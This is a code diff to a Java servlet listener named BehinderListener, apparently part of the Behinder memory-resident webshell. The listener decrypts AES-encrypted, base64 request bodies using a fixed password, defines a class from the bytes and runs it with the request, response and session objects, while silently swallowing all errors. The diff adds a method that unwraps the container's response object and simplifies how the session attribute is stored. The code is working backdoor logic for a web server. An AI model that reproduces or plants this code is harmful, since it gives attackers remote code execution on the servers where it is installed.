@@ -86,13 +86,9 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
                 HttpSession session = ((HttpServletRequest) request).getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                obj.put("response", response);
+                obj.put("response", getInternalResponse(response));
                 obj.put("session", session);
-                try {
-                    session.putValue("u", this.pass);
-                } catch (NoSuchMethodError e) {
-                    session.setAttribute("u", this.pass);
-                }
+                session.setAttribute("u", this.pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
@@ -100,6 +96,16 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
                 instance.equals(obj);
             }
         } catch (Exception ignored) {
+        }
+    }
+
+    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
+        while (true) {
+            try {
+                response = (HttpServletResponse) getFieldValue(response, "response");
+            } catch (Exception e) {
+                return response;
+            }
         }
     }
 
